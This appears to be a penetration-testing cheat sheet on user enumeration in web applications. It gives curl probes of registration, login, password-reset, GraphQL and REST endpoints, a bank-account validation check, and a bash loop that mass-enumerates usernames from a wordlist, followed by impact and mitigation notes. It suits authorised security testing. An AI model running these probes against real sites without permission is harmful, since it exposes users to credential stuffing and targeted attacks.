# User Enumeration Techniques

Common patterns for enumerating users on web applications.

## Registration Endpoints

### Username Enumeration
```bash
# Check if username exists
curl -s -X POST "https://target/register/check_user" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Requested-With: XMLHttpRequest" \
  -d "username=admin"

# Response analysis:
# {"valid": false, "data": {"check": true}} = user EXISTS
# {"valid": true, "data": {"check": false}} = user NOT EXISTS
```

### Bank Account Enumeration
```bash
# Check bank account validation
curl -s -X POST "https://target/register/check_bank_account" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Requested-With: XMLHttpRequest" \
  -d "bank_name=BCA&account_number=1234567890"

# Response: {"valid": true, "data": {"account_number": "1234567890", "bank_name": "BCA"}}
```

### Password Policy Leak
```bash
# Check password requirements
curl -s -X POST "https://target/register/check_password" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Requested-With: XMLHttpRequest" \
  -d "password=test"

# Response reveals password policy
```

## Login Endpoints

### Error Message Analysis
```bash
# Test with invalid username
curl -s -X POST "https://target/login" \
  -d "username=nonexistent&password=test"

# Test with valid username, wrong password
curl -s -X POST "https://target/login" \
  -d "username=admin&password=wrong"

# Different responses = user enumeration possible
```

### Response Time Analysis
```bash
# Time the response for valid vs invalid usernames
# Valid usernames might take longer (password hashing)
```

## Forgot Password

### Email Enumeration
```bash
# Test password reset
curl -s -X POST "https://target/forgot_password" \
  -d "email=admin@target.com"

# Different responses for valid vs invalid emails
```

## API Endpoints

### GraphQL
```bash
# Query user by ID
curl -s -X POST "https://target/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 1) { id username email } }"}'
```

### REST API
```bash
# Check user endpoints
curl -s "https://target/api/users/1"
curl -s "https://target/api/v1/users?username=admin"
```

## Mass Enumeration

### Wordlist Generation
```bash
# Common usernames
cat > usernames.txt << 'EOF'
admin
administrator
root
test
user
operator
manager
support
staff
boss
dealer
agent
EOF

# Enumerate
while read user; do
  result=$(curl -s -X POST "https://target/register/check_user" \
    -d "username=$user")
  if echo "$result" | grep -q '"check":true'; then
    echo "FOUND: $user"
  fi
done < usernames.txt
```

## Impact Assessment

### Low Impact
- Username enumeration only
- No sensitive data exposed

### Medium Impact
- Username + email enumeration
- Can be used for credential stuffing

### High Impact
- Username + email + role enumeration
- Can be used for targeted attacks

## Mitigation

- Generic error messages ("Invalid credentials")
- Rate limiting on enumeration endpoints
- CAPTCHA after failed attempts
- Account lockout policies
- Delayed responses for invalid usernames

## Pitfalls

- Always verify findings (false positives common)
- Check for rate limiting before mass enumeration
- Document the exact response format for each endpoint
- Test with multiple usernames to confirm pattern
